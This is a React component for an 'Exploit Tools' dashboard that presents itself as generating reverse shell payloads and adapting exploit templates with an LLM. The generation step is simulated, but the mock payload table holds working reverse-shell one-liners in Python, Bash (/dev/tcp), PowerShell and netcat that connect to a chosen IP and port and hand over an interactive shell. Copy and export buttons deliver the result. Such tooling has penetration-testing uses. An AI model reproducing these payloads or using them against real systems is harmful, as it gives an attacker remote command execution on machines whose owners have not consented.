'use client';

import { useState } from 'react';
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from '@/components/ui/card';
import { Button } from '@/components/ui/button';
import { Badge } from '@/components/ui/badge';
import { Terminal } from '@/components/ui/terminal';
import { 
  Target, 
  Play, 
  Download,
  Shield,
  AlertTriangle,
  Code,
  Network,
  CheckCircle,
  XCircle
} from 'lucide-react';

interface ExploitResult {
  type: 'reverse_shell' | 'template_adaptation';
  success: boolean;
  payload?: string;
  metadata: Record<string, any>;
  error?: string;
}

export function ExploitTools() {
  const [activeTab, setActiveTab] = useState<'reverse_shell' | 'template'>('reverse_shell');
  const [isGenerating, setIsGenerating] = useState(false);
  const [results, setResults] = useState<ExploitResult | null>(null);

  // Reverse Shell State
  const [targetIP, setTargetIP] = useState('192.168.1.100');
  const [targetPort, setTargetPort] = useState('4444');
  const [shellLanguage, setShellLanguage] = useState('python');

  // Template Adaptation State
  const [templateContent, setTemplateContent] = useState('');
  const [targetInfo, setTargetInfo] = useState('');

  const sampleTemplate = `#!/usr/bin/env python3
# Sample exploit template

TARGET_IP = "{{TARGET_IP}}"
TARGET_PORT = "{{TARGET_PORT}}"
TARGET_VERSION = "{{VERSION}}"

def exploit():
    print(f"Attacking {TARGET_IP}:{TARGET_PORT}")
    print(f"Target version: {TARGET_VERSION}")
    # Exploit logic here
    
if __name__ == "__main__":
    exploit()`;

  const handleGenerateReverseShell = async () => {
    setIsGenerating(true);
    
    try {
      // Simulate API call
      await new Promise(resolve => setTimeout(resolve, 2000));
      
      const mockPayloads = {
        python: `import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${targetIP}",${targetPort}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"])`,
        bash: `bash -i >& /dev/tcp/${targetIP}/${targetPort} 0>&1`,
        powershell: `$client = New-Object System.Net.Sockets.TCPClient("${targetIP}",${targetPort});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`,
        nc: `nc -e /bin/sh ${targetIP} ${targetPort}`
      };

      const result: ExploitResult = {
        type: 'reverse_shell',
        success: true,
        payload: mockPayloads[shellLanguage as keyof typeof mockPayloads],
        metadata: {
          language: shellLanguage,
          target_ip: targetIP,
          target_port: targetPort,
          payload_type: 'reverse_shell'
        }
      };

      setResults(result);
    } catch (error) {
      console.error('Generation failed:', error);
      setResults({
        type: 'reverse_shell',
        success: false,
        error: 'Failed to generate reverse shell payload',
        metadata: {}
      });
    } finally {
      setIsGenerating(false);
    }
  };

  const handleAdaptTemplate = async () => {
    if (!templateContent.trim() || !targetInfo.trim()) return;

    setIsGenerating(true);
    
    try {
      // Simulate API call
      await new Promise(resolve => setTimeout(resolve, 2000));
      
      const targetInfoObj = {
        TARGET_IP: '192.168.1.100',
        TARGET_PORT: '8080',
        VERSION: '2.3.1'
      };

      let adaptedContent = templateContent;
      Object.entries(targetInfoObj).forEach(([key, value]) => {
        adaptedContent = adaptedContent.replace(new RegExp(`{{${key}}}`, 'g'), value);
      });

      const result: ExploitResult = {
        type: 'template_adaptation',
        success: true,
        payload: adaptedContent,
        metadata: {
          original_length: templateContent.length,
          adapted_length: adaptedContent.length,
          placeholders_filled: Object.keys(targetInfoObj)
        }
      };

      setResults(result);
    } catch (error) {
      console.error('Adaptation failed:', error);
      setResults({
        type: 'template_adaptation',
        success: false,
        error: 'Failed to adapt template',
        metadata: {}
      });
    } finally {
      setIsGenerating(false);
    }
  };

  const loadSampleTemplate = () => {
    setTemplateContent(sampleTemplate);
    setTargetInfo(JSON.stringify({
      TARGET_IP: '192.168.1.100',
      TARGET_PORT: '8080',
      VERSION: '2.3.1'
    }, null, 2));
  };

  const copyToClipboard = (text: string) => {
    navigator.clipboard.writeText(text);
  };

  const exportPayload = () => {
    if (!results?.payload) return;
    
    const blob = new Blob([results.payload], { type: 'text/plain' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `exploit-${results.type}-${Date.now()}.txt`;
    a.click();
    URL.revokeObjectURL(url);
  };

  return (
    <div className="space-y-6">
      {/* Tool Selection */}
      <Card>
        <CardHeader>
          <CardTitle className="flex items-center space-x-2">
            <Target className="h-5 w-5" />
            <span>Exploit Tools</span>
          </CardTitle>
          <CardDescription>
            Generate reverse shell payloads and adapt exploit templates using LLM
          </CardDescription>
        </CardHeader>
        <CardContent>
          <div className="flex space-x-2">
            <Button
              variant={activeTab === 'reverse_shell' ? 'default' : 'outline'}
              onClick={() => setActiveTab('reverse_shell')}
              disabled={isGenerating}
            >
              <Network className="mr-2 h-4 w-4" />
              Reverse Shell
            </Button>
            <Button
              variant={activeTab === 'template' ? 'default' : 'outline'}
              onClick={() => setActiveTab('template')}
              disabled={isGenerating}
            >
              <Code className="mr-2 h-4 w-4" />
              Template Adapter
            </Button>
          </div>
        </CardContent>
      </Card>

      {/* Reverse Shell Generator */}
      {activeTab === 'reverse_shell' && (
        <Card>
          <CardHeader>
            <CardTitle>Reverse Shell Generator</CardTitle>
            <CardDescription>
              Generate reverse shell payloads in various programming languages
            </CardDescription>
          </CardHeader>
          <CardContent className="space-y-4">
            <div className="grid gap-4 md:grid-cols-3">
              <div className="space-y-2">
                <label className="text-sm font-medium">Target IP</label>
                <input
                  type="text"
                  value={targetIP}
                  onChange={(e) => setTargetIP(e.target.value)}
                  placeholder="192.168.1.100"
                  className="w-full px-3 py-2 border border-input rounded-md bg-background"
                  disabled={isGenerating}
                />
              </div>
              <div className="space-y-2">
                <label className="text-sm font-medium">Target Port</label>
                <input
                  type="number"
                  value={targetPort}
                  onChange={(e) => setTargetPort(e.target.value)}
                  placeholder="4444"
                  className="w-full px-3 py-2 border border-input rounded-md bg-background"
                  disabled={isGenerating}
                />
              </div>
              <div className="space-y-2">
                <label className="text-sm font-medium">Language</label>
                <select
                  value={shellLanguage}
                  onChange={(e) => setShellLanguage(e.target.value)}
                  className="w-full px-3 py-2 border border-input rounded-md bg-background"
                  disabled={isGenerating}
                >
                  <option value="python">Python</option>
                  <option value="bash">Bash</option>
                  <option value="powershell">PowerShell</option>
                  <option value="nc">Netcat</option>
                  <option value="perl">Perl</option>
                  <option value="ruby">Ruby</option>
                </select>
              </div>
            </div>

            <div className="flex items-center space-x-2">
              <Button
                onClick={handleGenerateReverseShell}
                disabled={isGenerating}
                className="security-button"
              >
                <Play className="mr-2 h-4 w-4" />
                {isGenerating ? 'Generating...' : 'Generate Payload'}
              </Button>
            </div>
          </CardContent>
        </Card>
      )}

      {/* Template Adapter */}
      {activeTab === 'template' && (
        <Card>
          <CardHeader>
            <CardTitle>Template Adapter</CardTitle>
            <CardDescription>
              Adapt exploit templates by filling placeholders with target information
            </CardDescription>
          </CardHeader>
          <CardContent className="space-y-4">
            <div className="grid gap-4 md:grid-cols-2">
              <div className="space-y-2">
                <label className="text-sm font-medium">Template Content</label>
                <textarea
                  value={templateContent}
                  onChange={(e) => setTemplateContent(e.target.value)}
                  placeholder="Enter exploit template with placeholders..."
                  className="w-full h-48 px-3 py-2 border border-input rounded-md bg-background font-mono text-sm"
                  disabled={isGenerating}
                />
              </div>
              <div className="space-y-2">
                <label className="text-sm font-medium">Target Info (JSON)</label>
                <textarea
                  value={targetInfo}
                  onChange={(e) => setTargetInfo(e.target.value)}
                  placeholder='{"TARGET_IP": "192.168.1.100", "TARGET_PORT": "8080"}'
                  className="w-full h-48 px-3 py-2 border border-input rounded-md bg-background font-mono text-sm"
                  disabled={isGenerating}
                />
              </div>
            </div>

            <div className="flex items-center space-x-2">
              <Button
                onClick={handleAdaptTemplate}
                disabled={isGenerating || !templateContent.trim() || !targetInfo.trim()}
                className="security-button"
              >
                <Play className="mr-2 h-4 w-4" />
                {isGenerating ? 'Adapting...' : 'Adapt Template'}
              </Button>
              <Button
                onClick={loadSampleTemplate}
                disabled={isGenerating}
                variant="outline"
              >
                Load Sample
              </Button>
            </div>
          </CardContent>
        </Card>
      )}

      {/* Results */}
      {results && (
        <Card>
          <CardHeader>
            <CardTitle className="flex items-center justify-between">
              <span className="flex items-center space-x-2">
                {results.success ? (
                  <CheckCircle className="h-5 w-5 text-security-green" />
                ) : (
                  <XCircle className="h-5 w-5 text-security-red" />
                )}
                <span>
                  {results.type === 'reverse_shell' ? 'Reverse Shell Payload' : 'Adapted Template'}
                </span>
              </span>
              <div className="flex items-center space-x-2">
                {results.success && results.payload && (
                  <>
                    <Button
                      onClick={() => copyToClipboard(results.payload!)}
                      variant="outline"
                      size="sm"
                    >
                      Copy
                    </Button>
                    <Button
                      onClick={exportPayload}
                      variant="outline"
                      size="sm"
                    >
                      <Download className="mr-2 h-4 w-4" />
                      Export
                    </Button>
                  </>
                )}
              </div>
            </CardTitle>
          </CardHeader>
          <CardContent>
            {results.success ? (
              <div className="space-y-4">
                <div className="bg-muted rounded-lg p-4">
                  <pre className="text-sm font-mono whitespace-pre-wrap break-all">
                    {results.payload}
                  </pre>
                </div>
                
                <div className="grid gap-4 md:grid-cols-2 text-sm">
                  {Object.entries(results.metadata).map(([key, value]) => (
                    <div key={key}>
                      <span className="text-muted-foreground capitalize">
                        {key.replace(/_/g, ' ')}:
                      </span>
                      <span className="ml-2 font-medium">{String(value)}</span>
                    </div>
                  ))}
                </div>
              </div>
            ) : (
              <div className="flex items-center space-x-2 text-destructive">
                <AlertTriangle className="h-5 w-5" />
                <span>{results.error}</span>
              </div>
            )}
          </CardContent>
        </Card>
      )}

      {/* Terminal Output */}
      <Card>
        <CardHeader>
          <CardTitle>Exploit Terminal</CardTitle>
          <CardDescription>
            LLM generation progress and debugging output
          </CardDescription>
        </CardHeader>
        <CardContent>
          <Terminal readOnly />
        </CardContent>
      </Card>
    </div>
  );
}
